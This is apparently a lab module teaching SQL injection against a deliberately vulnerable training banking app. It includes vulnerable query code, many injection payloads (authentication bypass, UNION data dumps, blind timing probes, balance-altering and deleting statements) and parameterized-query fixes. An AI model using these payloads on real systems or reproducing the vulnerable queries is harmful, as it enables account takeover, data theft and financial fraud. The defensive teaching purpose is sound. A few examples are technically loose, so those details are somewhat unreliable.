# Module 4: SQL Injection Vulnerabilities

## Understanding SQL Injection

SQL Injection (SQLi) is a critical web security vulnerability that allows attackers to manipulate database queries by injecting malicious SQL code through application inputs. In banking applications, this vulnerability can be particularly devastating, potentially leading to unauthorized access, data theft, and financial fraud.

### How SQL Injection Works

When an application builds SQL queries by concatenating strings with user input, it becomes vulnerable to SQL injection. Consider this simple example:

```python
# Vulnerable query construction
username = "alice"
query = f"SELECT * FROM user WHERE username = '{username}'"
# Results in: SELECT * FROM user WHERE username = 'alice'

# What happens with malicious input?
username = "' OR '1'='1"
query = f"SELECT * FROM user WHERE username = '{username}'"
# Results in: SELECT * FROM user WHERE username = '' OR '1'='1'
```

The attacker's input changes the query's logic from "find user named alice" to "find any user because 1=1 is always true".

### Types of SQL Injection

1. **In-band SQLi (Classic)**
   - **Union Based**: Combines results of malicious query with original query
     ```sql
     ' UNION SELECT username, password FROM user--
     ```
   - **Error Based**: Extracts data through database error messages
     ```sql
     ' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--
     ```

2. **Inferential SQLi (Blind)**
   - **Boolean Based**: Infers data by observing true/false responses
     ```sql
     ' AND (SELECT CASE WHEN (username = 'admin') THEN 1 ELSE 0 END) = 1--
     ```
   - **Time Based**: Infers data by observing response delays
     ```sql
     ' AND (SELECT CASE WHEN (username = 'admin') 
         THEN randomblob(100000000) ELSE randomblob(1) END)--
     ```

3. **Out-of-band SQLi**
   - Uses external channels to extract data
   - Example: Making DNS requests with extracted data
     ```sql
     ' AND (SELECT load_extension(
         (SELECT hex(group_concat(password)) FROM user)
     ))--
     ```

### Common Attack Techniques

1. **Authentication Bypass**
   ```sql
   -- Basic bypass
   ' OR '1'='1
   
   -- Comment-based bypass
   admin'--
   
   -- Union-based bypass
   ' UNION SELECT 'admin', 'hash', 1--
   ```

2. **Data Extraction**
   ```sql
   -- Extract table names
   ' UNION SELECT name, NULL FROM sqlite_master WHERE type='table'--
   
   -- Extract column names
   ' UNION SELECT sql, NULL FROM sqlite_master WHERE name='user'--
   
   -- Extract user data
   ' UNION SELECT username, password_hash FROM user--
   ```

3. **Database Manipulation**
   ```sql
   -- Insert new records
   '; INSERT INTO user VALUES ('hacker','hash',999999)--
   
   -- Update records
   '; UPDATE user SET balance=1000000 WHERE username='alice'--
   
   -- Delete records
   '; DELETE FROM transactions WHERE user_id=1--
   ```

### SQLite-Specific Techniques

1. **SQLite System Tables**
   ```sql
   -- List all tables
   ' UNION SELECT name, NULL FROM sqlite_master--
   
   -- Get table schema
   ' UNION SELECT sql, NULL FROM sqlite_master--
   ```

2. **SQLite Functions**
   ```sql
   -- String manipulation
   ' AND substr((SELECT password FROM user LIMIT 1),1,1)='a'--
   
   -- Time-based attacks
   ' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) 
       ELSE randomblob(1) END)--
   ```

3. **SQLite Type Exploitation**
   ```sql
   -- Type coercion
   ' AND typeof((SELECT balance FROM user LIMIT 1))='integer'--
   
   -- CAST exploitation
   ' AND CAST((SELECT password FROM user) AS INTEGER)--
   ```

## Overview

SQL Injection vulnerabilities in DVBank Lab exist in multiple critical endpoints, including user authentication, registration, and transaction processing. This module examines these vulnerabilities and their potential impact on banking operations.

## Vulnerable Endpoints

### 1. User Login
**Location**: `backend/routes/auth_routes.py`
```python
# Vulnerable: Direct string interpolation in login query
query = f"SELECT * FROM user WHERE username = '{username}'"
user = db.session.execute(query).fetchone()

# The application returns:
# - "Invalid credentials" if no user is found
# - Redirects to dashboard if user is found
```

> 🤔 **Challenge Note**: 
> Traditional SQL injection techniques like `' OR '1'='1` or `UNION` attacks won't work directly here. Why?
> - The application checks the password hash after the query
> - Simple authentication bypass is prevented by additional logic
> - Direct data extraction through UNION is not possible due to the application's response behavior
>
> **Your Challenge**:
> 1. Study the application's behavior carefully
> 2. Think about what information you can gather from login success/failure
> 3. Consider how timing attacks might help
> 4. Can you extract data without seeing it directly?

**Attack Vectors**:
```sql
-- Basic Authentication Bypass
username: ' OR '1'='1' --
password: anything

-- Union-Based Attack (Extract all users)
username: ' UNION SELECT * FROM user --
password: anything

-- Extract specific user
username: alice' AND '1'='1
password: anything
```

**Real-World Impact**:
- Attackers can extract entire database content
- Password hashes can be stolen
- Account balances can be discovered
- All without leaving obvious traces in logs

> 💡 **Hints for the Challenge**:
> 1. Think about boolean logic:
>    - What happens when your SQL condition is TRUE vs FALSE?
>    - How can you use this to confirm if a user exists?
> 
> 2. Consider timing attacks:
>    - SQLite's `randomblob()` function can create deliberate delays
>    - How can you use delays to extract information?
>
> 3. Data extraction strategy:
>    - Break down what you want to know into yes/no questions
>    - Use binary search to reduce the number of requests needed
>    - Think about how to extract data one character at a time
>
> 4. Advanced techniques:
>    - Can you combine boolean and timing attacks?
>    - How might you automate this process?
>    - What tools could help you measure response times accurately?

### 2. User Registration
**Location**: `backend/routes/auth_routes.py`
```python
# Vulnerable: String concatenation in registration
insert_query = f"INSERT INTO user (username, password_hash, balance) VALUES ('{username}', '{password_hash}', 0000.00)"
db.session.execute(insert_query)
```

**Attack Vectors**:
```sql
-- Create admin user with high balance
username: admin', 'hash', 1000000) --
password: anything

-- Modify other user's data
username: alice', 'newhash', 999999), ('bob
password: anything
```

### 3. Transaction Processing
**Location**: `backend/routes/transaction_routes.py`
```python
# Vulnerable: Unparameterized transaction query
query = f"SELECT * FROM transactions WHERE user_id = {user_id}"
transactions = db.session.execute(query).fetchall()
```

**Attack Vectors**:
```sql
-- View all transactions
user_id: 1 OR 1=1

-- Union attack to see other users' transactions
user_id: 1 UNION SELECT * FROM transactions

-- Modify transaction amounts
user_id: 1; UPDATE transactions SET amount = 1000000 WHERE id = 1--
```

## Impact Analysis

### Authentication Bypass Impact
- Unauthorized account access
- Identity theft
- Account takeover
- Privilege escalation

### Registration Manipulation Impact
- Creation of unauthorized accounts
- Balance manipulation
- Database corruption
- System compromise

### Transaction Attack Impact
- Unauthorized fund transfers
- Transaction history manipulation
- Financial fraud
- Audit trail tampering

## Detection Techniques

### 1. Manual Testing
Test each endpoint with these payloads:
```sql
-- Basic tests
' OR '1'='1
1 OR 1=1
' UNION SELECT NULL--

-- Error-based tests
' AND 1=convert(int,@@version)--
' AND 1=cast((SELECT @@version) as int)--

-- Time-based tests
'; WAITFOR DELAY '0:0:5'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### 2. Automated Testing
Use tools like:
- SQLmap with identified endpoints
- OWASP ZAP SQL Injection scanner
- Burp Suite's scanner

## Prevention Methods

### 1. Use Parameterized Queries
```python
# Safe login query
query = "SELECT * FROM user WHERE username = :username"
user = db.session.execute(query, {'username': username}).fetchone()

# Safe registration
query = "INSERT INTO user (username, password_hash, balance) VALUES (:username, :password_hash, :balance)"
db.session.execute(query, {
    'username': username,
    'password_hash': password_hash,
    'balance': 0
})

# Safe transaction query
query = "SELECT * FROM transactions WHERE user_id = :user_id"
transactions = db.session.execute(query, {'user_id': user_id}).fetchall()
```

### 2. Input Validation
```python
def validate_username(username):
    if not isinstance(username, str):
        return False
    if not username.isalnum():
        return False
    if len(username) > 30:
        return False
    return True

def validate_transaction_id(id):
    try:
        id = int(id)
        return id > 0
    except ValueError:
        return False
```

### 3. Use ORM
```python
# Using SQLAlchemy ORM
user = User.query.filter_by(username=username).first()
transaction = Transaction.query.get(transaction_id)
```

## Exercises

1. **Authentication Bypass**
   - Try logging in with a single quote (') to trigger SQL errors and expose database details
   - Extract user credentials using time-based blind attacks (e.g. CASE WHEN with randomblob)
   - Use sqlmap to automatically dump usernames and password hashes from the database
   - Implement proper parameterization

2. **Registration Exploitation**
   - Create users with manipulated balances
   - Attempt to modify existing users
   - Fix the registration endpoint

3. **Transaction Analysis**
   - Extract all transactions using injection
   - Extract all usernames and password hashes using UNION injection
   - Implement secure transaction queries

## Additional Resources

1. [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
2. [SQLite Injection Techniques](https://www.sqlite.org/security.html)
3. [SQLAlchemy Security Considerations](https://docs.sqlalchemy.org/en/14/core/security.html)
4. [OWASP SQL Injection Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
5. [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
6. [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
7. [NIST Database Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-123.pdf)
8. [Python DB-API Specification](https://www.python.org/dev/peps/pep-0249/)
9. [SQLAlchemy ORM Tutorial](https://docs.sqlalchemy.org/en/14/orm/tutorial.html)
10. [MySQL Security Best Practices](https://dev.mysql.com/doc/refman/8.0/en/security.html)

### Related Tools
1. [SQLMap](https://github.com/sqlmapproject/sqlmap) - SQL injection testing tool
2. [NoSQLMap](https://github.com/codingo/NoSQLMap) - NoSQL injection testing
3. [SQLiScanner](https://github.com/0xbug/SQLiScanner) - Automatic SQL injection detection
4. [jSQL Injection](https://github.com/ron190/jsql-injection) - Java-based SQL injection tool

### Academic Papers
1. [Advanced SQL Injection](https://dl.acm.org/doi/10.1145/1146847.1146849)
2. [Machine Learning for SQL Injection Detection](https://ieeexplore.ieee.org/document/8862804)

### Industry Standards
1. [PCI DSS SQL Requirements](https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf)
2. [HIPAA Database Security](https://www.hhs.gov/hipaa/for-professionals/security/guidance/index.html)

### Practice Platforms
1. [SQLZoo](https://sqlzoo.net/) - SQL learning and practice
2. [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
3. [HackTheBox SQL Injection Challenges](https://www.hackthebox.eu/)

⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments. 